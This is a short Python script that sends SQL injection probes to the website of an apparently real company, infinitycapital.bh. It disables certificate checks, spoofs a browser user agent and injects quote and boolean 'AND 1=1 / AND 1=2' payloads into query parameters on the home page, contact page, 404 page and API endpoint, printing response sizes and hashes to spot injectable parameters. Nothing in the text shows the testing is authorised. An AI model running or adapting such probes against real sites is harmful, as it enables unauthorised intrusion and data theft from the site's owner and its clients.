import hashlib, urllib.request, urllib.error, ssl, sys

BASE = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def get(path, extra_hdr=None):
    url = BASE + path
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept":"*/*"})
    if extra_hdr: req.add_header(*extra_hdr)
    try:
        r = urllib.request.urlopen(req, timeout=25, context=ctx)
        b = r.read()
        return r.status, len(b), hashlib.md5(b).hexdigest()[:12], b
    except urllib.error.HTTPError as e:
        b = e.read()
        return e.code, len(b), hashlib.md5(b).hexdigest()[:12], b
    except Exception as e:
        return "ERR", 0, str(e)[:40], b""

paths = ["/", "/?page=2", "/?page=2%27", "/?page=2%20AND%201=1", "/?page=2%20AND%201=2",
         "/?id=1", "/?id=1%27", "/?id=1%20AND%201=1", "/?id=1%20AND%201=2",
         "/?search=test", "/?search=test%27", "/?zzz=1",
         "/contact?x=1", "/contact?x=1%27", "/contact?cb=1",
         "/404?q=test", "/404?q=test%27", "/api/?id=1", "/api/?id=1%27",
         "/_next/image?url=&w=64&q=75"]
for p in paths:
    s,l,h,_ = get(p)
    print(f"{s}\t{l}\t{h}\t{p}")
